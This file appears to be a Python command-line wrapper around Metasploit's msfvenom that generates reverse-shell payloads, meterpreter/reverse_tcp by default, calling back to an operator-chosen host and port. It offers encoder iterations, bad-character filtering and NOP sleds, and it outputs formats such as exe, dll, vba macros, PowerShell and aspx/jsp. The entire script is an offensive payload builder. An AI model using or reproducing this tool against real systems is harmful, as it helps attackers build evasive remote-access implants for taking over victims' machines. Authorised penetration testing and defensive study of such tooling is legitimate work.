#!/usr/bin/python3

import re
import os
import sys
import argparse
import termcolor
import netifaces
import subprocess

class Venom:
	def __init__(self):
		try:
			self.args()
			if ".msf.present" not in subprocess.getoutput("ls -al ~").split():
				self.check_msf()

			else:
				printf("Metasploit is present.")
			self.generate()

		except KeyboardInterrupt:
			sys.exit()

		except PermissionError:
			error("Permission denied. Need elevated privileges.")

		except Exception as e:
			error(e)

	def args(self):
		parser = argparse.ArgumentParser(description="Metasploit Payload Creator.", usage="./%(prog)s -p win64", add_help=False)
		parser._optionals.title = "Flags"
		parser._positionals.title = "Positional arguments"
		parser.add_argument("-h", "--help", action="help", help="Shows this help message and exits.", default=argparse.SUPPRESS)
		parser.add_argument("-l", "--list", metavar="", help="Lists all the modules for the type provided.", choices=["payloads", "encoders", "nops", "platforms", "archs", "encrypt", "formats", "all"])
		if "-l" in sys.argv or "--list" in sys.argv:
			self.args = parser.parse_args()
			if self.args.list:
				list = subprocess.getoutput("msfvenom --list %s" % self.args.list)		
				print(list)
				sys.exit()
		parser.add_argument(metavar="LHOST", dest="lhost", help="Local ip address.")
		parser.add_argument("-p", "--payload", metavar="", help="Payload for creating the shell code. (default - win64)", choices=["win32", "win64", "lin32", "lin64"], default="win64")
		parser.add_argument("-t", "--type", metavar="", help="Type of the payload. (default - meterpreter/reverse_tcp)", default="meterpreter/reverse_tcp")
		parser.add_argument("--lport", help="Local port for listening. (default - 4444)", default=4444, type=int)
		parser.add_argument("--exit-func", metavar="", help="Exit Func.", dest="ef")
		parser.add_argument("-f", "--format", help="Format of the payload.", metavar="", default="raw")
		parser.add_argument("-e", "--encoder", help="The encoder to use.", metavar="")
		parser.add_argument("-i", "--iterations", help="The number of times to encode the payload.", metavar="", type=int, default=1)
		parser.add_argument("-s", "--space", metavar="", help="The maximum size of the resulting payload.", type=int)
		parser.add_argument("-b", "--bad-chars", metavar="", help="Characters to avoid. Example: '\x00\xff'.", dest="bc")
		parser.add_argument("-n", "--nopsled", metavar="", help="Prepend a nopsled of [length] size on to the payload.", type=int)
		parser.add_argument("-o", "--output", metavar="", help="Output file.")

		self.args = parser.parse_args()

		if not self.args.payload:
			parser.print_usage(sys.stderr)
			sys.stderr.write("%(prog)s: error: the following arguments are required: -p/--payload\n")
			sys.exit()

		if self.args.payload == "win64":
			self.payload = "windows/x64/"

		if self.args.payload == "win32":
			self.payload = "windows/"

		if "lin" in self.args.payload:
			if not self.args.payload[3:] == "32":
				self.payload = "linux/x64/"

			else:
				self.payload = "linux/x86/"

		if "/" not in self.args.type or "_" not in self.args.type:
			error("type format: shell/reverse_tcp or shell_reverse_tcp")

		if self.args.lport > 65535:
			error("Wrong port specified.")

		interfaces = os.listdir("/sys/class/net/")

		if self.args.lhost not in interfaces:
			ip = re.compile("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")
			if not ip.search(self.args.lhost):
				error("Wrong ip adrress specified.")

			else:
				self.ip = self.args.lhost

		else:
			self.ip = netifaces.ifaddresses(self.args.lhost)[netifaces.AF_INET][0]['addr']

		formats = ['asp', 'aspx', 'aspx-exe', 'axis2', 'dll', 'elf', 'elf-so', 'exe', 'exe-only', 'exe-service', 'exe-small', 'hta-psh', 'jar', 'jsp', 'loop-vbs', 'macho', 'msi', 'msi-nouac', 'osx-app', 'psh', 'psh-cmd', 'psh-net', 'psh-reflection', 'python-reflection', 'vba', 'vba-exe', 'vba-psh', 'vbs', 'war', 'base32', 'base64', 'bash', 'c', 'csharp', 'dw', 'dword', 'hex', 'java', 'js_be', 'js_le', 'num', 'perl', 'pl', 'powershell', 'ps1', 'py', 'python', 'raw', 'rb', 'ruby', 'sh', 'vbapplication', 'vbscript']
		
		if self.args.format:
			if self.args.format not in formats:		
				error("Wrong format specified.")

	def check_msf(self):
		if os.name == "nt":
			error("This script is only for linux based operating systems.")

		s = subprocess.getoutput("msfvenom")
		if "command not found" not in s:
			s = True
		else:
			s = False

		l = subprocess.getoutput("locate")
		if "no pattern to search for specified" in l:
			msf = subprocess.getoutput("locate metasploit -l 1")

		else:
			msf = subprocess.getoutput("find / -name 'metasploit' -type d 2>/dev/null")

		if len(msf) > 1 and s:
			printf('Metasploit is present.')
			os.system("touch ~/.msf.present")

		elif len(msf) > 1 and not s:
			error("MSFVENOM is not present.")

		else:
			error("Metasploit is not present, download it first.")

	def generate(self):
		args = ["msfvenom"]
		args.append("-p")
		args.append(self.payload + self.args.type)
		args.append("LHOST=%s" % self.ip)
		args.append("LPORT=%s" % self.args.lport)

		if self.args.ef:
			args.append("EXITFUNC=%s" % self.args.ef)

		if self.args.format:
			args.append("-f %s" % self.args.format)

		if self.args.encoder:
			args.append("-e %s" % self.args.encoder)
			args.append("-i %s" % self.args.iterations)

		if self.args.space:
			args.append("-s %s" % self.args.space)

		if self.args.bc:
			args.append("-b '%s'" % self.args.bc)

		if self.args.nopsled:
			args.append("-n %s" % self.args.nopsled)

		if self.args.output:
			args.append("-o %s" % self.args.output)

		else:
			if self.args.format and self.args.format != "raw":
				args.append("-o shell-code.%s" % self.args.format)

			else:
				args.append("-o shell-code.txt")


		cmd = ' '.join(x for x in args)
		
		printf("Generating shell-code...")

		s = subprocess.getoutput(cmd)
		list = s.split("\n")
		size = "0"
		for i in list:
			if " bytes" in i and "Payload" in i:
				size = i[i.index(":")+2:-6]

			if " bytes" in i and "Final" in i:
				size = i[i.index(":")+2:-6]

		printf("Shell-code generated successfully.")
		printf("Size: %s bytes." % size)
		if self.args.encoder:
			printf(f"Encode: {self.args.encoder} succeded {self.args.iterations} times.")
		printf(list[-1])

def error(s):
	sys.stderr.write(f"[{termcolor.colored('!', 'red')}] Exception: {s}\n")
	sys.exit()

def printf(s):
	print(f"[{termcolor.colored('+', 'blue')}] {termcolor.colored(s, 'green')}")

if __name__ == '__main__':
	Venom()